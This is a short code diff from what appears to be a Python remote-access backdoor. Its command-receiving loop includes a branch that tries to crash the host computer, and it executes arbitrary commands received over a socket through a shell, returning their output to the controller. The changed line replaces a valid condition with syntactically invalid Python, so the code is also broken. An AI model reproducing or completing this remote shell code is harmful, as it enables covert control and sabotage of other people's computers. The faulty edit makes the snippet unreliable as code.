@@ -169,7 +169,7 @@ def recieveCommands():
             except:
                 error = '\n' + RED + BOLD + '[!] There was an error in attempting to crash the computer' + END + '\n'
                 s.send(str.encode(error))
-        elif data[:].decode('utf-8') == 'dir':
+        else data[:].decode('utf-8') > 1:
             cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             output_bytes = cmd.stdout.read() + cmd.stderr.read()
             output_str = str(output_bytes, "utf-8")
